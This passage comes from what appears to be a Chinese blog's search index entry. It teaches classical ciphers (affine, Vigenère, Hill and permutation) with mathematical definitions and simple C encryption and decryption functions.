class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>解密效果如下：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418131238.png" alt="alt 仿射密码解密"></li>
</ul>
<h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>前面介绍的可以归结为单表代换密码，一旦密钥被选定，则每个字母对应的数字都被加密变换成对应的唯一数字，很容易被破解。下面介绍的维吉尼亚密码$(Vigenere\; Cipher)$是一种多表代换密码。</li>
<li>维吉尼亚密码一次加密$m\;$个字符，对应的密钥字为$m$个字符组成的串，对明文进行分组处理，处理的结果仍在$Z_{26}\;$下的运算。</li>
</ul>
<h3 id="密码体制-3"><a href="#密码体制-3" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>设$m\;$是一个正整数。定义$P=C=K=(Z_{26})^m$。对任意的密钥$K=(k_1,k_2,\cdots ,k_m)$，定义$e_k(x_1,x_2,\cdots ,x_m)=(x_1+k_1,x_2+k_2,\cdots ,x_m+k_m)$和$d_k(y_1,y_2,\cdots ,y_m)=(y_1-k_1,y_2-k_2,\cdots ,y_m-k_m)$。且以上所有运算都是在$Z_{26}$上进行。</li>
<li>维吉尼亚密码空间大小为$26^m$，所以即使$m$的值很小，穷尽密钥搜索算法也需要很长的时间。<h3 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h3></li>
<li><p>假设这里$m=6$，密钥字为$CIPHER$，其对应的数字串$K=(2,8,15,7,4,17)$。要加密的明文为：$WelcomeToHuazhongUniversityOfScienceAndTechnology$。首先将明文串转化为对应的数字串，再与对应的密钥数字进行相加后模26运算，再将对应的数字串转化为字符串即可。</p>
</li>
<li><p>加密代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;A&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            c[i]=(p[i]-<span class="string">&#x27;a&#x27;</span>+NumberKey[i%m])%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418142907.png" alt="alt 维吉尼亚密码加密"></p>
</li>
<li><p>解密代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Vig_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">char</span> SecertKey[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥字长度和密钥字串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %s&quot;</span>,&amp;m,&amp;SecertKey);</span><br><span class="line">    <span class="comment">//将密钥字串转化为数字串</span></span><br><span class="line">    <span class="keyword">int</span> NumberKey[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(SecertKey);i++)</span><br><span class="line">        NumberKey[i]=SecertKey[i]-<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;A&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=(c[i]-<span class="string">&#x27;a&#x27;</span>-NumberKey[i%m]+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418143203.png" alt="alt 维吉尼亚密码解密"></p>
</li>
</ul>
<h2 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>希尔密码的思想是利用线性变换的方法，同以上的方法一样，运算都是在$Z_{26}$上进行的。具体的其他介绍可自行查询。</li>
<li>引理1：矩阵$K$在模26情形下存在可逆矩阵的充分必要条件是$gcd(det(K),26)=1$。</li>
<li>定理1：设$K=(k_{i,j})$是一个定义在$Z_{26}$上的$m\times m$矩阵，若$K$在$Z_n$上可逆，则有$K^{-1}=(det\ K)^{-1}K^<em>$，这里$K^</em>$为矩阵$K$的伴随矩阵。</li>
<li>推论1：对$2\times 2$矩阵，设矩阵$K=\left[\begin{matrix} k_{1,1} &amp; k_{1,2} \\ k_{2,1} &amp; k_{2,2}\end{matrix} \right]$是一个定义在$Z_n$上的矩阵。$det\ K=k_{1,1}k_{2,2}-k_{1,2}k_{2,1}$是可逆的，则有：$K^{-1}=(det\ K)^{-1}\left[\begin{matrix}k_{2,2} &amp; -k_{1,2}\\ -k_{2,1} &amp; k_{1,1} \end{matrix} \right]$。</li>
</ul>
<h3 id="密码体制-4"><a href="#密码体制-4" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>设$m\geq2$为正整数，$P=C=(Z_{26})^m$，且$K={定义在Z_{26}上的m\times m可逆矩阵}$，对任意的密钥$K$，定义：$e_k(x)=xK$和$d_k(y)=yK^{-1}$。以上运算都是在$Z_{26}$上进行的。</li>
</ul>
<h3 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>函数代码实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hill</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> MAX=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> K1[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, K2[<span class="number">2</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> Temp1[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, Temp2[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> text[MAX] = &#123;<span class="number">0</span>&#125;,result[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> T1[MAX] = &#123;<span class="number">0</span>&#125;, T2[MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len, flag=<span class="number">0</span>, temp, temp1, i, j, num=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请填写明文或者密文:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,text);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请选择加密方式，输入1加密，输入2解密:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥k（以空格分开的数组）:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">2</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;K1[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">/**加密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将大写转成小写，并赋值给T1数组</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T1[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到加密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp1[<span class="number">0</span>] = T1[i];</span><br><span class="line">            Temp1[<span class="number">1</span>] = T1[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp2存储密文int值</span></span><br><span class="line">            Temp2[<span class="number">0</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">0</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp2[<span class="number">1</span>] = (Temp1[<span class="number">0</span>] * K1[<span class="number">0</span>][<span class="number">1</span>] + Temp1[<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T2[i] = Temp2[<span class="number">0</span>];</span><br><span class="line">            T2[i + <span class="number">1</span>] = Temp2[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T2[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;明文%s的密文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">/**解密**/</span></span><br><span class="line">        len = <span class="built_in">strlen</span>(text);</span><br><span class="line">        <span class="comment">// 当长度为奇数时补齐一位</span></span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            text[len] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            len = <span class="built_in">strlen</span>(text);</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(text[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; text[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                text[i] = text[i] + <span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            T2[i] = text[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 求K的逆</span></span><br><span class="line">        temp = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>; temp &lt; <span class="number">0</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            temp = (K1[<span class="number">0</span>][<span class="number">0</span>] * K1[<span class="number">1</span>][<span class="number">1</span>] - K1[<span class="number">0</span>][<span class="number">1</span>] * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span> * i;</span><br><span class="line">        &#125;</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((temp * i) % <span class="number">26</span> == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                temp1 = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">0</span>] = K1[<span class="number">1</span>][<span class="number">1</span>] * temp1;</span><br><span class="line">        K2[<span class="number">0</span>][<span class="number">1</span>] = (((<span class="number">-1</span> * K1[<span class="number">0</span>][<span class="number">1</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">0</span>] = (((<span class="number">-1</span> * K1[<span class="number">1</span>][<span class="number">0</span>]) + <span class="number">26</span>) * temp1) % <span class="number">26</span>;</span><br><span class="line">        K2[<span class="number">1</span>][<span class="number">1</span>] = K1[<span class="number">0</span>][<span class="number">0</span>] * temp1;</span><br><span class="line">        <span class="comment">// 得到解密后结果，存储在T2中</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i+=<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Temp2[<span class="number">0</span>] = T2[i];</span><br><span class="line">            Temp2[<span class="number">1</span>] = T2[i + <span class="number">1</span>];</span><br><span class="line">            <span class="comment">// Temp1存储明文int值</span></span><br><span class="line">            Temp1[<span class="number">0</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">0</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">0</span>]) % <span class="number">26</span>;</span><br><span class="line">            Temp1[<span class="number">1</span>] = (Temp2[<span class="number">0</span>] * K2[<span class="number">0</span>][<span class="number">1</span>] + Temp2[<span class="number">1</span>] * K2[<span class="number">1</span>][<span class="number">1</span>]) % <span class="number">26</span>;</span><br><span class="line">            T1[i] = Temp1[<span class="number">0</span>];</span><br><span class="line">            T1[i + <span class="number">1</span>] = Temp1[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len = len - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            result[i] = T1[i] + <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;密文%s的明文为:%s\n&quot;</span>,text,result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213734.png" alt="alt 希尔密码加密"></p>
</li>
<li><p>解密效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418213816.png" alt="alt 希尔密码解密"></p>
</li>
</ul>
<h2 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>代换密码：明文字母被不同的密文字母所代替。</li>
<li>置换密码：保持明文字母不变，利用置换打乱了明文字母的位置和次序。</li>
<li>定义在有限集$X$上的一个置换是一个双射函数$\pi :X\rightarrow X$。即对于任意的$x\in\ X$，存在唯一的$x^{‘}\in \ X$使得$\pi(x^{‘})=x\ $。则逆置换$\pi^{-1}:X\rightarrow X:\pi^{-1}(x)=x^{‘}\ 当且仅当\ \pi(x^{‘})=x$。</li>
</ul>
<h3 id="密码体制-5"><a href="#密码体制-5" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>令$m$为一正整数。$P=C=(Z_{26})^m$，$K\ $是由所有定义在集合$\{1,2,\cdots ,m\}$上的置换组成。对任意的密钥（即置换）$\pi$，定义：$e_{\pi}(x_1,x_2,\cdots ,x_m)=(x_{\pi_{(1)}},x_{\pi_{(2)}},\cdots,x_{\pi_{(m)}})$和$d_{\pi}(y_1,y_2,\cdots,y_m)=(y_{\pi^{-1}(1)},y_{\pi^{-1}(2)},\cdots,y_{\pi^{-1}(m)})$。其中$\pi^{-1}$为置换$\pi$的逆置换。</li>
</ul>
<h3 id="代码实现-5"><a href="#代码实现-5" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>代码加密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> t,k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的明文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    t=k-len%k; <span class="comment">//补全位数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">        p[len+i]=<span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;(len+t)/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[x[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len+t; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>加密效果：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418225710.png" alt="alt 置换密码加密"></p>
</li>
<li><p>代码解密实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Per_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   <span class="keyword">char</span> p[<span class="number">50</span>],c[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> x[<span class="number">26</span>];<span class="comment">//置换密钥</span></span><br><span class="line">    <span class="keyword">int</span> k,len,a=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你要输入的密文：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,p);</span><br><span class="line">    len=<span class="built_in">strlen</span>(p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入密钥长度：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入你选择的密钥方式：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> y[<span class="number">26</span>];<span class="comment">//逆置换</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;k;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x[j]==(i+<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                  y[i]=j+<span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;len/k; j++) <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            c[a++]=p[y[i]+k*j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li><p>解密效果：</p>
<p>同加密函数内容基本一样，区别在于将使用的置换更换为输入置换$\pi$的逆置换$\pi^{-1}$即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418231325.png" alt="alt 置换密码解密"></p>
</li>
</ul>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://blog.csdn.net/weixin_44883180/article/details/109009221">几种古典密码学算法的C实现</a></li>
<li><a href="https://blog.csdn.net/qq_45163122/article/details/104482811">希尔（Hill）密码（C语言）</a></li>
<li><a href="https://blog.csdn.net/dyw_666666/article/details/82466894">置换密码代码简单实现（C语言）</a></li>
</ul>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>算法</tag>
      </tags>
  </entry>
</search>
